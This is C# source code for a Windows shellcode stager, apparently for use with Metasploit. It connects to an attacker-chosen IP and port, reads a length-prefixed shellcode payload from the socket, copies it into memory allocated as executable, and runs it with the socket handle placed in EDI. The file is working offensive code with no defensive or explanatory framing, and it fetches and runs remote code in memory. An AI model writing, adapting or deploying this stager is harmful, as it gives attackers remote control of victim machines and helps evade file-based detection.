using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace Wrapper
{
    class Program
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate();

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Please pass an IP and port.");
            }
            else
            {
                // connect to MSF
                IPAddress handlerIP = IPAddress.Parse(args[0]);
                int port = Int32.Parse(args[1]);

                // connect to the handler
                var tcpClient = new TcpClient();
                tcpClient.Connect(handlerIP, port);

                if (tcpClient.Connected)
                {
                    var stream = tcpClient.GetStream();

                    // read the 4-byte length
                    byte[] payloadLength = new byte[4];
                    stream.Read(payloadLength, 0, 4);
                    
                    var length = BitConverter.ToUInt32(payloadLength, 0);
                    byte[] sc = new byte[length + 5];


                    // Allocate RWX memory for the shellcode
                    IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr) (sc.Length), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                    System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");

                    /* prepend a little assembly to move our SOCKET value to the EDI register
                       thanks mihi for pointing this out
                       BF 78 56 34 12     =>      mov edi, 0x12345678 */
                    sc[0] = 0xBF;

                    // copy the value of our SOCKET to the buffer
                    var baseAddrInt = BitConverter.GetBytes(tcpClient.Client.Handle.ToInt32());
                    Buffer.BlockCopy(baseAddrInt, 0, sc, 1, 4);

                    try
                    {
                        // Copy shellcode to RWX buffer
                        stream.Read(sc, 5, Convert.ToInt32(length));
                        Marshal.Copy(sc, 0, baseAddr, sc.Length);

                        // Get pointer to function created in memory
                        ExecuteDelegate del = (ExecuteDelegate) Marshal.GetDelegateForFunctionPointer(baseAddr, typeof (ExecuteDelegate));

                        del();
                    }
                    finally
                    {
                        VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
                    }

                }
                else
                {
                    Console.WriteLine("Could not connect to server.");
                }
            }

            //Console.ReadLine();
        }
    }
}
